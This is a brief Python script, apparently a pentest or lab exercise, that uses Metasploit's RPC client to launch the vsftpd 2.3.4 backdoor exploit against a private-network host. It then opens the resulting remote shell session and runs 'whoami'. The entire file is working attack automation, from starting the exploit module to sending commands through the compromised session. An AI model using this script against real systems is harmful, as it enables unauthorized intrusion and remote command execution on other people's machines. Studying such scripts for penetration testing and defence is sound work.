from metasploit.msfrpc import MsfRpcClient


# Start Metasploit RPCD in a terminal with:
# msfrpcd -P 123 -n -f -a 127.0.0.1
# "-n" - no database, "-f" - run in foreground, "-a" bind to

# Does not work with multi handler

client = MsfRpcClient('123')
# print client.modules.exploits (auxiliary, payloads, etc.)

exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
# print exploit.description (options, required)

exploit['RHOST'] = '192.168.1.5'
exploit['VERBOSE'] = True
# exploit.payloads
exploit.execute(payload='cmd/unix/interact')

print client.jobs.list
print client.sessions.list
# probably write a loop here to check if session is created

shell = client.sessions.session(1)
shell.write('whoami\n')
print shell.read()
